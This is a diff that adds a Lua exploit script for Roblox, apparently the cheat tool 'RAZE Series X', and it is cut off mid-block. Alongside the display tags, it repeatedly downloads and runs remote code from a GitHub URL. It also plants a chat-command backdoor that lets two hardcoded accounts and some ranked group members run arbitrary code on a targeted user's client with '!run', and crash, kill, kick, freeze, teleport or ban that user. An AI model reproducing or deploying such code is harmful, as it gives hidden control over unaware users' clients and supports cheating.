@@ -1,0 +1,2099 @@
+
+
+if game.Players.LocalPlayer.Character then
+    if game.Players.LocalPlayer.Character:FindFirstChild("Head") then
+        if game.Players.LocalPlayer.Character.Head:FindFirstChild("FaceCenterAttachment") then
+            game.Players.LocalPlayer.Character.Head:FindFirstChild("FaceCenterAttachment"):destroy()
+        end
+    end
+end
+game.Players.LocalPlayer.CharacterAdded:Connect(function(Char)
+    repeat wait() until Char 
+    repeat wait() until Char:FindFirstChild("Head")
+    repeat wait() until Char.Head:FindFirstChild("FaceCenterAttachment")
+    Char.Head:FindFirstChild("FaceCenterAttachment"):destroy()
+end)
+
+for i,v in pairs(game.Players:GetChildren()) do
+    if v ~= game.Players.LocalPlayer then
+        if v.Character ~= nil then
+            if v.Character:FindFirstChild("Humanoid") then
+                if v.Character:FindFirstChild("Head") then
+                    if v:IsInGroup("16764778") then
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/joemuma/script/main/Identification"))()
+                        if v.UserId == 2910302392 or v.UserId == 886220010 then
+                            v.Character.Humanoid.DisplayName = "[⚒️] "..v.Character.Humanoid.DisplayName
+                        elseif v:GetRankInGroup("16764778") == 255 and UserIds:find(v.UserId) then
+                                v.Character.Humanoid.DisplayName = "[⚒️] "..v.Character.Humanoid.DisplayName
+                        elseif v:GetRankInGroup("16764778") == 254 and UserIds:find(v.UserId) then
+                                v.Character.Humanoid.DisplayName = "[🛠️] "..v.Character.Humanoid.DisplayName
+                        elseif v:GetRankInGroup("16764778") == 253 and UserIds:find(v.UserId) then
+                                v.Character.Humanoid.DisplayName = "[⚜️] "..v.Character.Humanoid.DisplayName
+                        elseif v:GetRankInGroup("16764778") == 252 and UserIds:find(v.UserId) then
+                                v.Character.Humanoid.DisplayName = "[💲] "..v.Character.Humanoid.DisplayName
+                        elseif v:GetRankInGroup("16764778") == 1 and UserIds:find(v.UserId) then
+                                v.Character.Humanoid.DisplayName = "[✅] "..v.Character.Humanoid.DisplayName
+                        end
+                    else
+                        if not v.Character.Head:FindFirstChild("FaceCenterAttachment") then
+                            v.Character.Humanoid.DisplayName = "[😈] "..v.Character.Humanoid.DisplayName
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    v.CharacterAdded:Connect(function(Char)
+        repeat wait() until Char.Name ~= nil
+        if Char.Name ~= game.Players.LocalPlayer then
+            repeat wait() until Char 
+            repeat wait() until Char:FindFirstChild("Head")
+            repeat wait() until Char:FindFirstChild("Humanoid")
+            if game.Players:FindFirstChild(Char.Name):IsInGroup("16764778") then
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/joemuma/script/main/Identification"))()
+                if game.Players:FindFirstChild(Char.Name).UserId == 2910302392 or game.Players:FindFirstChild(Char.Name).UserId == 886220010 then
+                    Char.Humanoid.DisplayName = "[⚒️] "..Char.Humanoid.DisplayName
+                elseif game.Players:FindFirstChild(Char.Name):GetRankInGroup("16764778") == 255 and UserIds:find(game.Players:FindFirstChild(Char.Name).UserId) then
+                    Char.Humanoid.DisplayName = "[⚒️] "..Char.Humanoid.DisplayName
+                elseif game.Players:FindFirstChild(Char.Name):GetRankInGroup("16764778") == 254 and UserIds:find(game.Players:FindFirstChild(Char.Name).UserId) then
+                    Char.Humanoid.DisplayName = "[🛠️] "..Char.Humanoid.DisplayName
+                elseif game.Players:FindFirstChild(Char.Name):GetRankInGroup("16764778") == 253 and UserIds:find(game.Players:FindFirstChild(Char.Name).UserId) then
+                    Char.Humanoid.DisplayName = "[⚜️] "..Char.Humanoid.DisplayName
+                elseif game.Players:FindFirstChild(Char.Name):GetRankInGroup("16764778") == 252 and UserIds:find(game.Players:FindFirstChild(Char.Name).UserId) then
+                    Char.Humanoid.DisplayName = "[💲] "..Char.Humanoid.DisplayName
+                elseif game.Players:FindFirstChild(Char.Name):GetRankInGroup("16764778") == 1 and UserIds:find(game.Players:FindFirstChild(Char.Name).UserId) then
+                    Char.Humanoid.DisplayName = "[✅] "..Char.Humanoid.DisplayName
+                end
+            else
+                if not Char.Head:FindFirstChild("FaceCenterAttachment") then
+                    Char.Humanoid.DisplayName = "[😈] "..Char.Humanoid.DisplayName
+                else
+                    repeat wait() until not Char.Head:FindFirstChild("FaceCenterAttachment") or Char.Humanoid.Health == 0
+                    if Char.Humanoid.Health == 0 then
+                    else
+                        Char.Humanoid.DisplayName = "[😈] "..Char.Humanoid.DisplayName
+                    end
+                end
+            end
+        end
+    end)
+end
+
+game.Players.PlayerAdded:Connect(function(plr)
+    plr.CharacterAdded:Connect(function(Char)
+        repeat wait() until Char.Name ~= nil
+        if Char.Name ~= game.Players.LocalPlayer then
+            repeat wait() until Char 
+            repeat wait() until Char:FindFirstChild("Head")
+            repeat wait() until Char:FindFirstChild("Humanoid")
+            if game.Players:FindFirstChild(Char.Name):IsInGroup("16764778") then
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/joemuma/script/main/Identification"))()
+                if game.Players:FindFirstChild(Char.Name).UserId == 2910302392 or game.Players:FindFirstChild(Char.Name).UserId == 886220010 then
+                    Char.Humanoid.DisplayName = "[⚒️] "..Char.Humanoid.DisplayName
+                elseif game.Players:FindFirstChild(Char.Name):GetRankInGroup("16764778") == 255 and UserIds:find(game.Players:FindFirstChild(Char.Name).UserId) then
+                    Char.Humanoid.DisplayName = "[⚒️] "..Char.Humanoid.DisplayName
+                elseif game.Players:FindFirstChild(Char.Name):GetRankInGroup("16764778") == 254 and UserIds:find(game.Players:FindFirstChild(Char.Name).UserId) then
+                    Char.Humanoid.DisplayName = "[🛠️] "..Char.Humanoid.DisplayName
+                elseif game.Players:FindFirstChild(Char.Name):GetRankInGroup("16764778") == 253 and UserIds:find(game.Players:FindFirstChild(Char.Name).UserId) then
+                    Char.Humanoid.DisplayName = "[⚜️] "..Char.Humanoid.DisplayName
+                elseif game.Players:FindFirstChild(Char.Name):GetRankInGroup("16764778") == 252 and UserIds:find(game.Players:FindFirstChild(Char.Name).UserId) then
+                    Char.Humanoid.DisplayName = "[💲] "..Char.Humanoid.DisplayName
+                elseif game.Players:FindFirstChild(Char.Name):GetRankInGroup("16764778") == 1 and UserIds:find(game.Players:FindFirstChild(Char.Name).UserId) then
+                    Char.Humanoid.DisplayName = "[✅] "..Char.Humanoid.DisplayName
+                end 
+            else
+                if not Char.Head:FindFirstChild("FaceCenterAttachment") then
+                    Char.Humanoid.DisplayName = "[😈] "..Char.Humanoid.DisplayName
+                else
+                    repeat wait() until not Char.Head:FindFirstChild("FaceCenterAttachment") or Char.Humanoid.Health == 0
+                    if Char.Humanoid.Health == 0 then
+                    else
+                        Char.Humanoid.DisplayName = "[😈] "..Char.Humanoid.DisplayName
+                    end
+                end
+            end
+        end
+    end)
+end)
+
+
+function LoadFile()
+    if readfile("Server.txt") ~= "" then
+        local json1 = readfile("Server.txt")
+        data1 = game:GetService("HttpService"):JSONDecode(json1)
+    end
+    if readfile("Game.txt") ~= "" then
+        local json = readfile("Game.txt")
+        data = game:GetService("HttpService"):JSONDecode(json)
+    end
+end
+
+LoadFile()
+if data1 ~= nil then
+    if game.JobId == data1.JobId then
+        game.Players.LocalPlayer:kick("Kicked. Premium User Activity: You Are Banned from this Server")
+    end
+end
+if data ~= nil then
+    if game.PlaceId == data.PlaceId then
+        game.Players.LocalPlayer:kick("Kicked. Premium User Activity: You Are Banned from this Game")
+    end
+end
+
+
+
+
+
+
+
+local Connections = {}
+
+for Index,Connection in pairs(Connections) do
+    Index[Connection] = nil
+    Connection:Disconnect()
+end
+if not game.workspace:FindFirstChild("Pls no Delete") then
+    Pls = Instance.new("Folder",game.workspace)
+    Pls.Name = "Pls no Delete"
+end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/joemuma/script/main/Identification"))()
+Connections["OnChat"] = game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
+    local Player = game:GetService("Players")[data.FromSpeaker]
+    local Message = data.Message
+    Prefix = "!"
+    if Player.UserId == 2910302392 or Player.UserId == 886220010 then
+        if Message:lower():find(Prefix.."game ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                local data = {
+                    PlaceId = game.PlaceId,
+                }
+                local json
+                if writefile then
+                    local json = game:GetService("HttpService"):JSONEncode(data)
+                    writefile("Game.txt", json)
+                end
+                game.Players.LocalPlayer:kick("Premium User Activity | You Are Now DisAllowed From Using RAZE Series X In This Server ~ Premium User:"..Player.Name)
+            end
+        end
+        
+        if Message:lower():find(Prefix.."server ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                local data = {
+                    JobId = game.JobId,
+                }
+                local json
+                if writefile then
+                    local json = game:GetService("HttpService"):JSONEncode(data)
+                    writefile("Server.txt", json)
+                end
+                game.Players.LocalPlayer:kick("Premium User Activity | You Are Now DisAllowed From Using RAZE Series X In This Server ~ Premium User:"..Player.Name)
+            end
+        end
+        
+        if Message:lower():find(Prefix.."run ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                splitt = Message:split(Splitted[1].." "..Splitted[2])
+                pcall(function()
+                    loadstring(splitt[2])()
+                end)
+            end
+        end
+        
+        if Message:lower():find(Prefix.."crash ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                for i=1,math.huge do
+                    pcall(function()
+                        setclipboard("Premium Users Ontop")
+                        print("Premium Users Ontop")
+                    end)
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."kick ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                game.Players.LocalPlayer:kick("Premium User Activity | You Got Kicked By "..Player.Name)
+            end
+        end
+
+        if Message:lower():find(Prefix.."block ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unblock ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        for i,v in pairs(game.workspace["Pls no Delete"]:GetChildren()) do
+                            if v.Name == CurrentPlayer.Name then
+                                v:destroy()
+                            end
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."freeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                        if v:IsA("BasePart") then
+                            v.Anchored = true
+                        end
+                    end
+                end))
+                getgenv().Froozen = true
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unfreeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                getgenv().Froozen = false
+                if Froozen then
+                    print("UnFroozen")
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."re ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                pcall(function()
+                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                end)
+            end
+        end
+
+        if Message:lower():find(Prefix.."bring ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                if Froozen then
+                    Froozen:Disconnect()
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA("BasePart") then
+                        v.Anchored = false
+                    end
+                end
+                wait()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
+                if getgenv().Froozen == true then
+                    Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                            if v:IsA("BasePart") then
+                                v.Anchored = true
+                            end
+                        end
+                    end))
+                end
+            end
+        end
+        if Message:lower():find(Prefix.."tell") then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Player.Name.." I Am a Fellow RAZE Series X User","All")
+        end
+    elseif Player:GetRankInGroup("16764778") == 255 and UserIds:find(Player.UserId) then
+        if Message:lower():find(Prefix.."game ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                local data = {
+                    PlaceId = game.PlaceId,
+                }
+                local json
+                if writefile then
+                    local json = game:GetService("HttpService"):JSONEncode(data)
+                    writefile("Game.txt", json)
+                end
+                game.Players.LocalPlayer:kick("Premium User Activity | You Are Now DisAllowed From Using RAZE Series X In This Server ~ Premium User:"..Player.Name)
+            end
+        end
+        
+        if Message:lower():find(Prefix.."server ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                local data = {
+                    JobId = game.JobId,
+                }
+                local json
+                if writefile then
+                    local json = game:GetService("HttpService"):JSONEncode(data)
+                    writefile("Server.txt", json)
+                end
+                game.Players.LocalPlayer:kick("Premium User Activity | You Are Now DisAllowed From Using RAZE Series X In This Server ~ Premium User:"..Player.Name)
+            end
+        end
+        
+        if Message:lower():find(Prefix.."run ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                splitt = Message:split(Splitted[1].." "..Splitted[2])
+                pcall(function()
+                    loadstring(splitt[2])()
+                end)
+            end
+        end
+        
+        if Message:lower():find(Prefix.."crash ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                for i=1,math.huge do
+                    pcall(function()
+                        setclipboard("Premium Users Ontop")
+                        print("Premium Users Ontop")
+                    end)
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."kick ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                game.Players.LocalPlayer:kick("Premium User Activity | You Got Kicked By "..Player.Name)
+            end
+        end
+
+        if Message:lower():find(Prefix.."block ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+            
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                        Nam = Instance.new("Folder",game.workspace["Pls no Delete"])
+                        Nam.Name = CurrentPlayer.Name
+                        wait()
+                        while game:GetService("Workspace")["Pls no Delete"]:FindFirstChild(CurrentPlayer.Name) do
+                            pcall(function()
+                                if 15 >= (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - CurrentPlayer.Character.HumanoidRootPart.Position).magnitude then
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - (CurrentPlayer.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Unit * 10)
+                                end
+                            end)
+                            wait()
+                        end
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."unblock ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[3])
+            local CurrentPlayer1 = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer1 == game.Players.LocalPlayer then
+                if CurrentPlayer ~= game.Players.LocalPlayer and CurrentPlayer ~= nil then
+                    if game.workspace:FindFirstChild("Pls no Delete") then
+                        for i,v in pairs(game.workspace["Pls no Delete"]:GetChildren()) do
+                            if v.Name == CurrentPlayer.Name then
+                                v:destroy()
+                            end
+                        end
+                    else
+                        Pls = Instance.new("Folder",game.workspace)
+                        Pls.Name = "Pls no Delete"
+                    end
+                end
+            end
+        end
+        
+        if Message:lower():find(Prefix.."freeze ") then
+            Splitted = Message:lower():split(" ")
+            function getFullNameFromPartial(PartialName)
+                local CurrentPlayer=nil;
+                local Players= game.Players:GetPlayers();
+                for i=1,#Players do
+                    local foundPlayer=Players[i];
+                    if string.lower(foundPlayer.DisplayName):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    elseif string.lower(foundPlayer.Name):sub(1,#PartialName)==string.lower(PartialName)then
+                        CurrentPlayer=foundPlayer;
+                        break;
+                    end;
+                end;
+                return CurrentPlayer;
+            end
+        
+            local CurrentPlayer = getFullNameFromPartial(Splitted[2])
+            if CurrentPlayer == game.Players.LocalPlayer then
+                Froozen = game:GetService("RunService").RenderStepped:Connect(pcall(function()
+                    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
